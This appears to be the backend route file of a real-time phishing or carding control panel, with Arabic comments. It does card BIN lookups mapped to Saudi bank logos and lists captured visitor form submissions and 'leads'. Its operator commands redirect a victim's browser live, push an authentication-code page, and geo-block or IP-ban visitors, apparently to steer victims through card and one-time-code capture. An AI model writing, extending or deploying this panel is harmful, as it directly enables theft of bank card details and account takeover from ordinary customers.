import express from 'express';
import Visitor from '../models/Visitor.js';
import Submission from '../models/Submission.js';
import Site from '../models/Site.js';
import BlockedCountry, { SystemSetting } from '../models/BlockedCountry.js';
import BannedIP from '../models/BannedIP.js';
import { requireAuth } from '../models/middleware/auth.js';

const router = express.Router();

// كاش في الذاكرة لتخزين نتائج الـ BIN
const serverBinCache = {};

// 💳 نقطة نهاية سريعة ومجانية لاستعلام الـ BIN وتحديد الدومين والشعار
router.get('/bin-lookup/:bin', requireAuth, async (req, res) => {
    try {
        const bin = String(req.params.bin).replace(/\D/g, '').substring(0, 6);
        if (bin.length < 6) return res.status(400).json({ error: "Invalid BIN" });

        if (serverBinCache[bin]) {
            return res.json(serverBinCache[bin]);
        }

        // استعلام سريع بمهلة 2.5 ثانية كحد أقصى لمنع أي تعليق
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2500);

        const response = await fetch(`https://data.handyapi.com/bin/${bin}`, {
            headers: { 'Accept': 'application/json' },
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!response.ok) throw new Error("API not ok");
        const d = await response.json();

        // استخراج اسم البنك والدومين لجلب الشعار بدقة
        const bankRaw = d.Issuer || d.Bank || '';
        let logoDomain = '';

        if (bankRaw.toLowerCase().includes('rajhi')) logoDomain = 'alrajhibank.com.sa';
        else if (bankRaw.toLowerCase().includes('riyad')) logoDomain = 'riyadbank.com';
        else if (bankRaw.toLowerCase().includes('sab') || bankRaw.toLowerCase().includes('awwal')) logoDomain = 'sab.com';
        else if (bankRaw.toLowerCase().includes('anb') || bankRaw.toLowerCase().includes('arab national')) logoDomain = 'anb.com.sa';
        else if (bankRaw.toLowerCase().includes('qnb') || bankRaw.toLowerCase().includes('qatar national')) logoDomain = 'qnb.com';
        else if (bankRaw.toLowerCase().includes('alinma')) logoDomain = 'alinma.com';
        else if (bankRaw.toLowerCase().includes('ahli') || bankRaw.toLowerCase().includes('snb')) logoDomain = 'alahli.com';

        const result = {
            bankName: bankRaw,
            bankLogo: logoDomain ? `https://logo.clearbit.com/${logoDomain}` : (d.BankLogo || ''),
            scheme: (d.Scheme || '').toUpperCase(),
            type: (d.Type || 'DEBIT').toUpperCase(),
            cardTier: (d.CardTier || 'CLASSIC').toUpperCase(),
            countryName: d.Country?.Name || '',
            countryCode: d.Country?.A2 || '',
            currency: d.Country?.Currency || 'SAR',
            flag: d.Country?.Flag || ''
        };

        serverBinCache[bin] = result;
        res.json(result);
    } catch {
        res.json({
            bankName: '',
            bankLogo: '',
            scheme: '',
            type: 'DEBIT',
            cardTier: 'CLASSIC',
            countryName: '',
            countryCode: '',
            currency: 'SAR',
            flag: ''
        });
    }
});

function resolveAllowedSites(user, querySites) {
    let allowed = [];
    if (user.role === 'admin') {
        if (querySites && querySites !== 'all') {
            allowed = querySites.split(',').filter(Boolean);
        }
    } else {
        const userSites = user.assignedSites || [];
        if (querySites && querySites !== 'all') {
            const requested = querySites.split(',').filter(Boolean);
            allowed = requested.filter(s => userSites.includes(s));
        } else {
            allowed = userSites;
        }
    }
    return allowed;
}

router.get('/blocked-countries', requireAuth, async (req, res) => {
    try {
        const countries = await BlockedCountry.find().sort({ createdAt: -1 });
        let setting = await SystemSetting.findOne({ key: 'geo_mode' });
        if (!setting) {
            setting = await SystemSetting.create({ key: 'geo_mode', mode: 'blacklist', allowedCountry: '', allowedCountryName: '' });
        }
        res.json({ countries, setting });
    } catch {
        res.status(500).json({ error: "فشل جلب بيانات الحظر" });
    }
});

router.post('/block-country', requireAuth, async (req, res) => {
    try {
        const { countryCode, countryName } = req.body;
        if (!countryCode) return res.status(400).json({ error: "رمز الدولة مطلوب" });

        const code = countryCode.trim().toUpperCase();
        await BlockedCountry.findOneAndUpdate(
            { countryCode: code },
            { countryCode: code, countryName: countryName || code },
            { upsert: true, new: true }
        );

        await Visitor.updateMany(
            { country: code },
            { isBlocked: true, status: 'go', redirectUrl: '/blocked?_r=' + Date.now() }
        );

        req.io.emit('geo_settings_updated');
        res.json({ success: true, message: `تم حظر ${countryName || code} بنجاح` });
    } catch {
        res.status(500).json({ error: "فشل تنفيذ الحظر" });
    }
});

router.delete('/unblock-country/:code', requireAuth, async (req, res) => {
    try {
        const code = req.params.code.trim().toUpperCase();
        await BlockedCountry.deleteOne({ countryCode: code });

        await Visitor.updateMany(
            { country: code },
            { isBlocked: false, status: 'idle', redirectUrl: '' }
        );

        req.io.emit('geo_settings_updated');
        res.json({ success: true, message: `تم إلغاء حظر الدولة بنجاح` });
    } catch {
        res.status(500).json({ error: "فشل إلغاء الحظر" });
    }
});

router.post('/set-geo-mode', requireAuth, async (req, res) => {
    try {
        const { mode, allowedCountry, allowedCountryName } = req.body;
        
        const setting = await SystemSetting.findOneAndUpdate(
            { key: 'geo_mode' },
            { mode, allowedCountry: allowedCountry || '', allowedCountryName: allowedCountryName || '' },
            { upsert: true, new: true }
        );

        if (mode === 'whitelist' && allowedCountry) {
            const targetCode = allowedCountry.trim().toUpperCase();
            await Visitor.updateMany(
                { country: { $ne: targetCode } },
                { isBlocked: true, status: 'go', redirectUrl: '/blocked?_r=' + Date.now() }
            );
            await Visitor.updateMany(
                { country: targetCode },
                { isBlocked: false, status: 'idle', redirectUrl: '' }
            );
        } else if (mode === 'blacklist') {
            const blocked = await BlockedCountry.find().distinct('countryCode');
            await Visitor.updateMany(
                { country: { $nin: blocked } },
                { isBlocked: false, status: 'idle', redirectUrl: '' }
            );
            await Visitor.updateMany(
                { country: { $in: blocked } },
                { isBlocked: true, status: 'go', redirectUrl: '/blocked?_r=' + Date.now() }
            );
        }

        req.io.emit('geo_settings_updated');
        res.json({ success: true, setting });
    } catch {
        res.status(500).json({ error: "فشل تحديث نمط الحظر" });
    }
});

router.post('/ban-ip', requireAuth, async (req, res) => {
    try {
        const { ip, token } = req.body;
        if (!ip) return res.status(400).json({ error: "عنوان IP مطلوب" });

        await BannedIP.findOneAndUpdate(
            { ip: ip.trim() },
            { ip: ip.trim(), reason: 'حظر يدوي من اللوحة' },
            { upsert: true, new: true }
        );

        await Visitor.updateMany(
            { ip: ip.trim() },
            { isBlocked: true, status: 'go', redirectUrl: '/blocked?_r=' + Date.now() }
        );

        if (token) {
            const updated = await Visitor.findOne({ token });
            if (updated) req.io.emit('visitor_updated', updated);
        }

        res.json({ success: true, message: "تم حظر الآي بي بنجاح" });
    } catch {
        res.status(500).json({ error: "فشل حظر الآي بي" });
    }
});

router.post('/set-lead-status', requireAuth, async (req, res) => {
    try {
        const { token, leadStatus } = req.body;
        const visitor = await Visitor.findOneAndUpdate(
            { token },
            { leadStatus },
            { new: true }
        );
        if (!visitor) return res.status(404).json({ error: "الزائر غير موجود" });

        req.io.emit('visitor_updated', visitor);
        res.json({ success: true, visitor });
    } catch {
        res.status(500).json({ error: "فشل تحديث حالة الزائر" });
    }
});

router.post('/mark-read', requireAuth, async (req, res) => {
    try {
        const { token } = req.body;
        await Visitor.updateOne({ token }, { isRead: true });
        res.json({ success: true });
    } catch {
        res.status(500).json({ error: "خطأ" });
    }
});

router.get('/visitors', requireAuth, async (req, res) => {
    try {
        const targetSites = resolveAllowedSites(req.user, req.query.sites);
        const filter = {
            $or: [
                { phone: { $ne: "", $exists: true } },
                { name: { $ne: "زائر جديد", $exists: true } },
                { lastSubmissionDate: { $exists: true } }
            ]
        };

        if (targetSites.length > 0) {
            filter.siteKey = { $in: targetSites };
        } else if (req.user.role !== 'admin') {
            return res.json([]);
        }

        const visitors = await Visitor.find(filter)
            .sort({ lastSubmissionDate: -1, createdAt: -1 })
            .limit(60)
            .lean();

        for (let v of visitors) {
            const lastSub = await Submission.findOne({ visitorToken: v.token }).sort({ createdAt: -1 });
            if (lastSub) v.lastFormName = lastSub.formName;
        }

        res.json(visitors);
    } catch {
        res.status(500).json({ error: "Error fetching visitors" });
    }
});

router.get('/online', requireAuth, async (req, res) => {
    try {
        const timeLimit = new Date(Date.now() - 15000);
        const targetSites = resolveAllowedSites(req.user, req.query.sites);
        const filter = { lastSeen: { $gte: timeLimit } };

        if (targetSites.length > 0) {
            filter.siteKey = { $in: targetSites };
        } else if (req.user.role !== 'admin') {
            return res.json([]);
        }

        const onlineVisitors = await Visitor.find(filter)
            .sort({ createdAt: -1 })
            .lean();

        res.json(onlineVisitors);
    } catch {
        res.status(500).json({ error: "Error fetching online visitors" });
    }
});

router.get('/submissions/:token', requireAuth, async (req, res) => {
    try {
        const submissions = await Submission.find({ visitorToken: req.params.token }).sort({ createdAt: 1 });
        const visitor = await Visitor.findOne({ token: req.params.token });
        let schemas = [];
        if (visitor && visitor.siteKey) {
            const site = await Site.findOne({ siteKey: visitor.siteKey });
            if (site && site.formSchemas) {
                schemas = site.formSchemas;
            }
        }
        res.json({ submissions, schemas });
    } catch (err) {
        res.status(500).json({ error: "Error fetching submissions: " + err.message });
    }
});

router.post('/command', requireAuth, async (req, res) => {
    try {
        const { token, command, payload } = req.body;
        let visitor = await Visitor.findOne({ token });
        if (!visitor) return res.status(404).json({ error: "الزائر غير موجود" });

        if (command === 'redirect') {
            visitor.status = 'go';
            visitor.redirectUrl = payload.url + '?_r=' + Date.now();
        } else if (command === 'block') {
            visitor.isBlocked = !visitor.isBlocked;
            visitor.status = visitor.isBlocked ? 'go' : 'idle';
            visitor.redirectUrl = visitor.isBlocked ? '/blocked?_r=' + Date.now() : '';
        } else if (command === 'auth') {
            visitor.status = 'go';
            visitor.redirectUrl = '/auth-match?_r=' + Date.now();
            visitor.authCode = payload.code;
        } else if (command === 'notify') {
            visitor.callAlert = Date.now();
        }

        await visitor.save();
        req.io.emit('visitor_updated', visitor);
        res.json({ success: true, message: "تم إرسال الأمر بنجاح" });
    } catch {
        res.status(500).json({ error: "حدث خطأ أثناء إرسال الأمر" });
    }
});

router.delete('/clear', requireAuth, async (req, res) => {
    try {
        if (req.user.role !== 'admin') {
            return res.status(403).json({ error: "غير مصرح - للمدير فقط" });
        }
        await Visitor.deleteMany({});
        await Submission.deleteMany({});
        res.json({ success: true });
    } catch {
        res.status(500).json({ error: "حدث خطأ أثناء الحذف" });
    }
});

export default router;